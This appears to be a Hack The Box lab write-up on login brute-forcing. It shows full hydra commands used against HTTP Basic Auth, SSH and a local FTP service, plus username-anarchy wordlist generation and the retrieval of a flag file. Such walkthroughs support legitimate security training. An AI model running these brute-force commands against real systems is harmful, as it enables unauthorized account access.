---
tags:
  - htb
  - linux
  - brute-forcing
  - skills-assessment
  - part1
  - part2
draft: false
date: 2026-07-20
title: login-brute-forcing-skills-assesment
---

---
`part1:`

### Q1: What is the password for the basic auth login?

After navigating to the target IP address, we are presented with an HTTP GET Basic Authentication login form. We can perform a brute-force attack using the provided `usernames.txt` and `passwords.txt` wordlists:

```
hydra -L usernames.txt -P passwords.txt $IPaddress$ -s $PORT$ -f http-get /
```

Running this command reveals the administrator password, allowing us to answer the question.
### Q2: After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

After successfully authenticating, the prompt displays the username required for Part 2:
![[images/q2_answer.png]]

---
`part2:`

### Q1: What is the username of the ftp user you find via brute-forcing?
We begin by verifying the service running on the provided IP address and port using the `ftp` client:

```
└──╼ [★]$ ftp $ipAddress$ $PORT$
Connected to $IPaddress$
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
ftp> 
```

The banner response indicates that the service on this port is actually **OpenSSH**, not FTP. Knowing this, we perform a brute-force attack against SSH using Hydra:

```
hydra -l $foundUsername$ -P passwords.txt -s $PORT$ -t 4 $IPaddress$ ssh
```

After obtaining the valid credentials, we log in via SSH:
```
ssh $foundUsername$@$IPaddress$ -p $PORT$
```
We can find some interesting things here:
![[images/ssh_files.png]]

Inside `IncidentReport.txt`, we find the full name of the target user. To generate a wordlist of potential usernames based on this name, we use `username-anarchy`:

```
cd username-anarchy
./username-anarchy $name$ $surname$ > users.txt
cd
hydra -L username-anarchy/users.txt -P passwords.txt -t 4 127.0.0.1 ftp
```
After that we will get correct credentials for `FTP` service.

### Q2: What is the flag contained within flag.txt
We connect to the local FTP service on `127.0.0.1` using the discovered credentials and download the flag file:
```
ftp 127.0.0.1
```
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
226 Directory send OK.
ftp> get flag.txt
226 Transfer complete.
ftp> exit
```
Finally, we display the contents of the downloaded file:
```
cat flag.txt
```
